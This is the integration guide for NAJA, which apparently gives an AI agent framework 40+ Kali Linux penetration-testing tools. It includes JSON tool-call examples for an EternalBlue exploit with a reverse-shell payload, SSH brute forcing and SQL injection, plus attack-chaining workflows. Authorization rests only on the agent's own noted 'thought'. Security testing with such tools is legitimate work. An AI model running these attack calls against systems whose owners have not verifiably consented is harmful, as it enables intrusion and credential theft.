# Kali Linux Tools Integration Guide

## Overview

NAJA includes 40+ professional Kali Linux penetration testing tools, each with dedicated prompts for optimal AI usage.

## How It Works

Each tool is defined as a markdown prompt in `/prompts/agent.system.tool.TOOLNAME.md` with:
- Tool description and use cases
- Security warnings
- Argument specifications
- JSON usage examples

Agent Zero reads these prompts and knows how to use each tool properly.

## Tool Categories

### 🌐 Web Application Testing (9 tools)

**nmap_scanner** - Network port scanning and service detection
```json
{
    "tool_name": "nmap_scanner",
    "tool_args": {
        "target": "192.168.1.100",
        "scan_type": "aggressive"
    }
}
```

**nikto_scanner** - Web vulnerability scanning
```json
{
    "tool_name": "nikto_scanner",
    "tool_args": {
        "target": "http://target.com"
    }
}
```

**sqlmap_tool** - Automated SQL injection testing
```json
{
    "tool_name": "sqlmap_tool",
    "tool_args": {
        "url": "http://target.com/page?id=1",
        "level": 2,
        "risk": 2
    }
}
```

**ffuf_tool** - Fast web fuzzer for directories/files
```json
{
    "tool_name": "ffuf_tool",
    "tool_args": {
        "url": "http://target.com/FUZZ",
        "wordlist": "/usr/share/wordlists/dirb/common.txt",
        "match_status": "200,301,302"
    }
}
```

**wpscan_tool** - WordPress security scanner
```json
{
    "tool_name": "wpscan_tool",
    "tool_args": {
        "url": "https://wordpress-site.com",
        "enumerate": "vp,u"
    }
}
```

**dirb_tool**, **wfuzz_tool**, **commix_tool**, **zaproxy_tool**, **xsstrike_tool** - Additional web testing tools

### 🔐 Password & Brute Force (6 tools)

**john_tool** - Password hash cracker
```json
{
    "tool_name": "john_tool",
    "tool_args": {
        "hash_file": "/tmp/hashes.txt",
        "wordlist": "/usr/share/wordlists/rockyou.txt"
    }
}
```

**hydra_tool** - Network service brute forcer
```json
{
    "tool_name": "hydra_tool",
    "tool_args": {
        "target": "192.168.1.100",
        "protocol": "ssh",
        "username": "admin",
        "password_list": "/usr/share/wordlists/rockyou.txt"
    }
}
```

**hashcat_tool** - GPU-accelerated hash cracking
**medusa_tool** - Parallel brute forcing
**crunch_tool** - Custom wordlist generator  
**cewl_tool** - Website-based wordlist creator

### 💥 Exploitation (3 tools)

**metasploit_tool** - Full exploitation framework
```json
{
    "tool_name": "metasploit_tool",
    "tool_args": {
        "module": "exploit/windows/smb/ms17_010_eternalblue",
        "target": "192.168.1.100",
        "payload": "windows/meterpreter/reverse_tcp",
        "lhost": "192.168.1.50",
        "lport": 4444
    }
}
```

**msfvenom_tool** - Payload generator
**searchsploit_tool** - Exploit database search

### 🔍 OSINT & Reconnaissance (6 tools)

**theharvester_tool** - Email/subdomain OSINT
```json
{
    "tool_name": "theharvester_tool",
    "tool_args": {
        "domain": "target.com",
        "sources": "google,bing,linkedin"
    }
}
```

**dnsenum_tool**, **sublist3r_tool**, **amass_tool**, **fierce_tool**, **reconng_tool**

### 📡 Network Analysis (7 tools)

**tshark_tool** - Packet analysis
**tcpdump_tool** - Packet capture
**masscan_tool** - Ultra-fast port scanner
**rustscan_tool** - Modern fast scanner
**ettercap_tool** - MITM attacks
**responder_tool** - LLMNR poisoning

### 📶 Wireless (3 tools)

**aircrack_tool** - WiFi security testing
**wifite_tool** - Automated wireless auditing  
**kismet_tool** - Wireless detector/IDS

### 🔬 Forensics (3 tools)

**volatility_tool** - Memory forensics
**foremost_tool** - File carving
**binwalk_tool** - Firmware analysis

### 🎭 Social Engineering (1 tool)

**setoolkit_tool** - Social Engineering Toolkit

### 🔧 Universal (1 tool)

**kali_security_tool** - Universal wrapper for 600+ Kali tools

## Usage Pattern

Agent Zero automatically selects appropriate tools based on task requirements:

**Example Conversation:**
```
User: "Scan target.com for vulnerabilities"

Agent: 
1. Uses nmap_scanner for port discovery
2. Uses nikto_scanner for web vulnerabilities
3. Uses sqlmap_tool if forms detected
4. Provides comprehensive report
```

## Best Practices

### 1. Always Get Authorization
```json
{
    "thoughts": [
        "User confirmed authorization to test target.com",
        "Running port scan on authorized target"
    ],
    "tool_name": "nmap_scanner",
    "tool_args": {"target": "target.com"}
}
```

### 2. Progressive Scanning
Start with passive, move to active:
1. OSINT (passive) → theHarvester, amass
2. Port scan → nmap, masscan
3. Service scan → nmap -sV
4. Vulnerability scan → nikto, sqlmap
5. Exploitation → metasploit

### 3. Document Everything
Agent Zero logs all tool usage for reporting.

### 4. Rate Limiting
Some tools have rate limiting. Use appropriate speeds:
- masscan: --rate 1000 (adjustable)
- ffuf: --threads 40 (default)

## Security & Legal

⚠️ **CRITICAL WARNINGS:**

1. **Authorization Required** - Only test systems you own or have written permission to test
2. **Legal Compliance** - Unauthorized testing is illegal in most jurisdictions
3. **Responsible Disclosure** - Report vulnerabilities responsibly
4. **No Malicious Use** - Tools are for defensive security only

## Tool Chaining Examples

### Complete Web App Assessment
```
1. theharvester_tool → Find subdomains
2. nmap_scanner → Scan discovered hosts
3. nikto_scanner → Test web servers
4. sqlmap_tool → Test for SQLi
5. Generate report
```

### Network Penetration Test
```
1. masscan_tool → Fast port discovery
2. nmap_scanner → Service enumeration
3. searchsploit_tool → Find exploits
4. metasploit_tool → Exploitation
5. Document findings
```

### Password Audit
```
1. hydra_tool → Brute force attack
2. hashcat_tool → Crack captured hashes
3. Report weak passwords
```

## Adding Custom Tools

To add new tools:

1. Create `/prompts/agent.system.tool.TOOLNAME.md`
2. Follow existing format:
   - Description
   - Arguments (with types)
   - Usage examples in JSON
   - Security warnings

Example template:
```markdown
### custom_tool:
Tool description

⚠️ Security warning

#### Arguments:
 *  "arg1" (string) : Description
 *  "arg2" (Optional, integer) : Description

#### Usage examples:
##### 1: Example usage
\`\`\`json
{
    "thoughts": ["Why using this"],
    "tool_name": "custom_tool",
    "tool_args": {
        "arg1": "value"
    }
}
\`\`\`
```

## Troubleshooting

### Tool Not Found
- Check tool is installed: `which toolname`
- Install if needed: `apt install toolname`

### Permission Denied
- Some tools require root: Use `sudo` or run as root
- Wireless tools need monitor mode

### Network Issues
- Check firewall rules
- Verify network connectivity
- Some tools need raw socket access

## Resources

- [Kali Tools Documentation](https://www.kali.org/tools/)
- [NAJA GitHub](https://github.com/pistakugli/naja)
- [Agent Zero](https://github.com/frdel/agent-zero)

## License & Disclaimer

NAJA is for authorized security testing only. Users are responsible for compliance with all applicable laws. Unauthorized access is illegal.
